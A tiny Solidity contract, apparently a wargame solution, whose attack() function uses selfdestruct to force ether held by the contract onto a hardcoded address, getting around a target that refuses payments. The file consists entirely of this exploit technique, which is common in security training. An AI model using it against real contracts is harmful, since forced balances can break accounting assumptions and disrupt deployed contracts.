// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SendTOForce {
    constructor()public{}

    function attack() public {
        selfdestruct(0xa2891d4667E123eA767baD5E2687A1200cFcC55D);
    }

    //Allow this contract to take money so it can send money to the other contract :)
    function collect() public payable returns(uint) {
        return address(this).balance;
    }
}